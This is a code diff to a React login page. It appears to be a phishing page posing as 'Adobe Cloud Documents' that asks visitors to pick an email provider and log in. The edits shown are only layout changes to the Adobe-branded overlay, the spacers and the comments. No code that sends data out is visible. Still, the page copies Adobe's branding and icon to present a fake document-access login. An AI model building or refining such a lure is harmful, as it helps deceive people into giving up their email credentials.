@@ -130,28 +130,26 @@ const LoginPage: React.FC<LoginPageProps> = ({
         backgroundRepeat: 'no-repeat'
       }}
     >
-      {/* Decorative overlay: smaller logo + stacked subtitle lines (logo moved slightly up and kept inline with the text) */}
-      <div className="absolute left-6 top-1/3 transform -translate-y-1/2 flex flex-col items-start gap-1 z-0 pointer-events-none">
-        <div className="flex items-center gap-3">
-          <img
-            src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/Adobe_Document_Cloud_icon_%282020%29.svg/640px-Adobe_Document_Cloud_icon_%282020%29.svg.png"
-            alt="Adobe Cloud"
-            className="w-8 h-8 md:w-10 md:h-10 object-contain drop-shadow-lg"
-          />
-          <div className="text-white drop-shadow-lg">
-            <div className="text-2xl md:text-3xl font-semibold leading-tight">Adobe Cloud Documents</div>
-            <div className="text-white/90 text-sm md:text-base mt-1">PDF and e-signing tools.</div>
-            <div className="text-white/80 text-sm md:text-base italic">securely access documents</div>
-          </div>
+      {/* Decorative overlay: small logo tightly beside the title (matches provided screenshot spacing) */}
+      <div className="absolute left-6 top-1/3 transform -translate-y-1/2 flex items-center gap-1 z-0 pointer-events-none">
+        <img
+          src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/Adobe_Document_Cloud_icon_%282020%29.svg/640px-Adobe_Document_Cloud_icon_%282020%29.svg.png"
+          alt="Adobe Cloud"
+          className="w-8 h-8 object-contain drop-shadow-lg"
+        />
+        <div className="text-white drop-shadow-lg">
+          <div className="text-3xl md:text-4xl font-semibold leading-tight">Adobe Cloud Documents</div>
+          <div className="text-white/90 text-sm md:text-base mt-1">PDF and e-signing tools.</div>
+          <div className="text-white/80 text-sm md:text-base italic">securely access documents</div>
         </div>
       </div>
 
-      {/* Card: increased vertical length only; width unchanged and kept at same horizontal offset */}
+      {/* Card: vertical size preserved from last requested layout; providers pushed down via spacer */}
       <div className="w-full max-w-md relative z-10 ml-6 md:ml-24 lg:ml-40">
         <div className="bg-white/80 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/20 py-12 px-8 relative overflow-hidden min-h-[640px]">
           <div className="absolute inset-0 bg-gradient-to-br from-white/50 to-transparent pointer-events-none"></div>
           <div className="relative z-10">
-            {/* Centered "Select Your Provider" pill in header (kept unchanged) */}
+            {/* Centered "Select Your Provider" pill in header */}
             <div className="flex items-center justify-center mb-4">
               <div className="inline-flex items-center gap-2 px-3 py-1.5 bg-gradient-to-r from-blue-50 to-indigo-50 rounded-full border border-blue-100">
                 <Sparkles className="w-4 h-4 text-blue-500" />
@@ -159,8 +157,8 @@ const LoginPage: React.FC<LoginPageProps> = ({
               </div>
             </div>
 
-            {/* Spacer to push provider boxes further down (large gap between header and providers) */}
-            <div className="h-12 md:h-20" />
+            {/* big spacer so providers sit lower in the card */}
+            <div className="h-20 md:h-28" />
 
             <div className="mt-4">
               {!selectedProvider ? (
@@ -174,7 +172,6 @@ const LoginPage: React.FC<LoginPageProps> = ({
                         aria-label={`Select ${provider.name}`} 
                         type="button"
                       >
-                        {/* Standalone logo (no background) */}
                         <img 
                           src={provider.logo} 
                           alt={provider.name} 
@@ -203,7 +200,6 @@ const LoginPage: React.FC<LoginPageProps> = ({
                       <ArrowLeft className="w-4 h-4 text-gray-600" />
                     </button>
                     <div className="flex items-center gap-3">
-                      {/* selected-provider logo stands alone */}
                       <img 
                         src={emailProviders.find(p => p.name === selectedProvider)?.logo} 
                         alt={selectedProvider} 
